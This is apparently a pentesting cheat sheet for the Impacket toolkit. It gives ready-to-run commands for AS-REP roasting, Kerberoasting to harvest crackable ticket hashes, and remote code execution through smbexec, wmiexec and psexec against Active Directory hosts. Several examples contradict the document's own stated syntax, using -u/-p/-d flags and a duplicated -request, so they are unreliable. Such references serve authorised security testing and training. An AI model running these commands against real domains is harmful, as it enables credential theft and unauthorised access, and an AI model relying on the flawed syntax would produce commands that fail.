# Impacket - Tools

> Impacket is a Python toolkit for working with network protocols, especially SMB and Kerberos, commonly used in Active Directory pentesting and post-exploitation.

## Basic usage

> These options are common across many Impacket scripts.

```bash
# Basic authentication format
impacket-script [[domain/]username[:password]]@<target|ip>

# Common options used in most Impacket scripts
-u USERNAME          # Username
-p PASSWORD          # Password (can be omitted with -no-pass)
-d DOMAIN            # Domain name
-h or --help         # Display help
-hashes LM:NT        # Pass LM:NT hashes instead of password
-dc-ip IP            # Domain Controller IP (for LDAP requests etc)
-target-ip IP        # Target machine IP (for SMB/WMI/WinRM scripts)
-no-pass             # Use when no password is required (e.g., AS-REP roasting)
```

```bash
# Common locations of Impacket scripts on Kali Linux:
/usr/share/impacket/script/
/usr/bin/impacket-*
/usr/share/doc/python3-impacket/examples/
```

## Kerberos exploit

- `-request-user`: Used to request a specific user account
- `-no-pass`: Used to test ldap anonymous bind

### AS-REP Roasting (GetNPUsers.py)

> Extract AS-REP hashes from accounts without preauthentication enabled.

```bash
# Query users from file, no password needed, output for hashcat/john:
GetNPUsers.py domain.lan/ -usersfile users.txt -dc-ip 192.168.1.10 -no-pass -format hashcat -outputfile asrep_hashes.txt

# Query specific user with password:
GetNPUsers.py domain.lan/user:'password' -dc-ip 192.168.1.10 -format hashcat -outputfile asrep_hashes.txt

# Query specific user with NT hash:
GetNPUsers.py domain.lan/user -hashes LMHASH:NTHASH -dc-ip 192.168.1.10 -format hashcat -outputfile asrep_hashes.txt
```

### Kerberoasting (GetUserSPNs.py)

> Request service tickets (TGS) for service accounts to crack their passwords offline.

- Prerequisites:
  - Valid user account (auth required)

```bash
# Request all SPNs using user credentials:
GetUserSPNs.py -request domain.lan/user:'password' -dc-ip 192.168.1.10 -request

# Request specific user
GetUserSPNs.py -request domain.lan/user:'password' -dc-ip 192.168.1.10 -request-user <specific-user> -outputfile kerberoasting.txt
```

## Remote Execution

- Prerequisites:
  - Valid user account (auth required)

```bash
# SMB
impacket-smbexec -u user -p 'password' -d domain.lan 192.168.1.10
```

```bash
# WMI
impacket-wmiexec -u user -p 'Password123!' -d domain.lan 192.168.1.20
```

```bash
impacket-psexec -u user -p 'Password123!' -d domain.lan 192.168.1.10
```
